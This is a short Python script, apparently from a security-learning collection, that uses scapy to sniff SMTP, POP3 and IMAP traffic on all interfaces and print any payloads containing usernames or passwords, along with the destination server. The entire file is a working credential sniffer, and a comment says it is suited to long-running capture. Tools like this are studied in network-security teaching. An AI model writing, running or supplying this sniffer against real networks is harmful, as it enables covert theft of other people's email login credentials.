#!/usr/bin/env python

__author__ = "bt3gl"

''' A simple sniffer to capture SMTP, POP3, IMAP credentials'''


from scapy.all import *

# our packet callback
def packet_callback(packet):
    # check to make sure it has a data payload
    if packet[TCP].payload:
        mail_packet = str(packet[TCP].payload)
        if 'user' in mail_packet.lower() or 'pass' in mail_packet.lower():
            print '[*] Server: %s' % packet[IP].dst
            print '[*] %s' %packet[TCP].payload



# fire up the sniffer on all interfaces, with no filtering
# store 0 ensures that the packets are not kept in memory (good when
# leaving a long term sniffer running, so wont consume too much ram)
sniff(filter="tcp port 110 or tcp port 25 or tcp port 143", prn=packet_callback, store=0)


